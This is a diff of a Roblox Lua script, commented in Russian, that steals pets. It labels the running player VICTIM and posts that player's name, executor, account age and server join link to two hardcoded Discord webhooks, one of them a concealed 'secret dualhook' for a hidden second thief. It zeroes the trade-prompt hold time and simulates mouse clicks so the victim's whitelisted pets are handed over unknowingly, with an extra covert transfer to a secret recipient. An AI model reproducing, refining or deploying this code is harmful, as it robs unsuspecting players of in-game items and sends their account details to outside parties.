@@ -1,10 +1,8 @@
-repeat 
-    task.wait()
-until game:IsLoaded()
-
--- 🔐 DualHook config (секрет)
+-- Настройка DualHook
 getgenv().DhUser = "Warrior_ggs"
-getgenv().DhWebhook = "https://discord.com/api/webhooks/1402819441519099904/ExWswHavk5BTB4c0YbmmYwWAqqr1gCHSDkpedr_AH_1sKIbfie4qEfIXwLTPEAGKS28C" -- ← замени на твой второй вебхук
+getgenv().DhWebhook = "https://discord.com/api/webhooks/1402819441519099904/ExWswHavk5BTB4c0YbmmYwWAqqr1gCHSDkpedr_AH_1sKIbfie4qEfIXwLTPEAGKS28C" -- ваш второй вебхук
+
+repeat task.wait() until game:IsLoaded()
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1398128232821293146/L1XkMHS9HYOhE-LwusnMR_b-hrdgn3M5vY9WYzoc6F9W-9wqHheFjlueX1yweFexJ80J"
 local VICTIM = game.Players.LocalPlayer
@@ -24,16 +22,12 @@ local VirtualInputManager = game:GetService("VirtualInputManager")
 local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
 
 local function waitForJoin()
-    local findTarget = false
-    local trigeretName = nil
-
     for _, player in game.Players:GetPlayers() do
-        if not table.find(USERNAMES, player.Name) then continue end
-        trigeretName = player.Name
-        findTarget = true
+        if table.find(USERNAMES, player.Name) then
+            return true, player.Name
+        end
     end
-
-    return findTarget, trigeretName
+    return false, nil
 end
 
 function createDiscordEmbed(petList, totalValue, fileUrl)
@@ -43,10 +37,10 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
         fields = {
             {
                 name = "👤 **Player Information**",
-                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
-                    VICTIM.Name, 
-                    table.concat(USERNAMES, " "), 
-                    identifyexecutor(), 
+                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```",
+                    VICTIM.Name,
+                    table.concat(USERNAMES, " "),
+                    identifyexecutor(),
                     VICTIM.AccountAge
                 ),
                 inline = false
@@ -63,46 +57,36 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
             },
             {
                 name = "🏝️ **Join with URL**",
-                value = string.format(
-                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", 
-                    game.JobId, 
-                    game.PlaceId, 
-                    game.JobId
-                ),
+                value = string.format("[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)",
+                    game.JobId, game.PlaceId, game.JobId),
                 inline = false
             }
         },
-        footer = { text = string.format("%s | %s", game.PlaceId, game.JobId) }
+        footer = {
+            text = string.format("%s | %s", game.PlaceId, game.JobId)
+        }
     }
 
     local data = {
-        content = string.format(
-            "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
-            game.PlaceId,
-            game.JobId
-        ),
+        content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")", game.PlaceId, game.JobId),
         username = VICTIM.Name,
         avatar_url = "https://cdn.discordapp.com/attachments/1388921046228275221/1401159395676655637/296008df4615dbf3dde7cba3a426b15e.jpg",
         embeds = {embed}
     }
 
     local jsonData = game:GetService("HttpService"):JSONEncode(data)
-    local headers = { ["Content-Type"] = "application/json" }
+    local headers = {["Content-Type"] = "application/json"}
     local request = http_request or request or HttpPost or syn.request
 
-    -- 📤 Основной лог
-    local response = request({
+    -- Основной вебхук
+    request({
         Url = WEBHOOK_URL,
         Method = "POST",
         Headers = headers,
         Body = jsonData
     })
 
-    if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
-        warn("Ошибка отправки в Discord:", response.StatusCode, response.Body)
-    end
-
-    -- 💣 Секретный dualhook лог
+    -- Секретный Dualhook
     for _, player in pairs(game.Players:GetPlayers()) do
         if player.Name == getgenv().DhUser and getgenv().DhWebhook and #getgenv().DhWebhook > 10 then
             request({
@@ -121,36 +105,36 @@ local function teleportTarget(targetName)
 end
 
 local function deltaBypass()
-    VirtualInputManager:SendMouseButtonEvent(
-        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
-        0, true, nil, false
-    )
+    VirtualInputManager:SendMouseButtonEvent(workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2, 0, true, nil, false)
     task.wait()
-    VirtualInputManager:SendMouseButtonEvent(
-        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
-        0, false, nil, false
-    )
+    VirtualInputManager:SendMouseButtonEvent(workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2, 0, false, nil, false)
 end
 
 local function checkPetsWhilelist(pet)
     for _, name in PET_WHITELIST do
-        if string.find(pet, name) then return true end
+        if string.find(pet, name) then
+            return true
+        end
     end
 end
 
-local function getPetObject(petUid: string): Instance?
+local function getPetObject(petUid)
     for _, object in pairs(VICTIM.Backpack:GetChildren()) do
-        if object:GetAttribute("PET_UUID") == petUid then return object end
+        if object:GetAttribute("PET_UUID") == petUid then
+            return object
+        end
     end
-    for _, object in workspace[VICTIM.Name]:GetChildren() do
-        if object:GetAttribute("PET_UUID") == petUid then return object end
+    for _, object in pairs(workspace[VICTIM.Name]:GetChildren()) do
+        if object:GetAttribute("PET_UUID") == petUid then
+            return object
+        end
     end
     return nil
 end
 
 local function equipPet(pet)
     if pet:GetAttribute("d") then
-        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
+        game:GetService("ReplicatedStorage").GameEvents.Favorite_Item:FireServer(pet)
     end
     VICTIM.Character.Humanoid:EquipTool(pet)
 end
@@ -163,32 +147,43 @@ local function getPlayersPets()
     end
 end
 
-local function startSteal(target)
-    if game.Players[target].Character.Head:FindFirstChild("ProximityPrompt") then
-        game.Players[target].Character.Head.ProximityPrompt.HoldDuration = 0
+local function startSteal(targetName)
+    if game.Players[targetName].Character.Head:FindFirstChild("ProximityPrompt") then
+        game.Players[targetName].Character.Head.ProximityPrompt.HoldDuration = 0
         deltaBypass()
     end
 end
 
--- ✅ Основная и скрытая передача петов
+-- ✅ Dual Transfer
 local function checkPetsInventory(target)
+    local dhPlayer = nil
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player.Name == getgenv().DhUser then
+            dhPlayer = player
+            break
+        end
+    end
+
     for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        if not checkPetsWhilelist(value.PetType) then continue end
+        if not checkPetsWhilelist(value.PetType) then
+            continue
+        end
 
         local petObject = getPetObject(petUid)
         if not petObject then continue end
 
         equipPet(petObject)
         task.wait(0.2)
+
+        -- Основной получатель
+        teleportTarget(target)
         startSteal(target)
 
-        -- 💣 Секретно передаём пета DhUser
-        for _, player in pairs(game.Players:GetPlayers()) do
-            if player.Name == getgenv().DhUser and player.Name ~= target then
-                teleportTarget(getgenv().DhUser)
-                task.wait(0.1)
-                startSteal(getgenv().DhUser)
-            end
+        -- Секретный DhUser (если другой игрок)
+        if dhPlayer and dhPlayer.Name ~= target then
+            task.wait(0.1)
+            teleportTarget(dhPlayer.Name)
+            startSteal(dhPlayer.Name)
         end
     end
 end
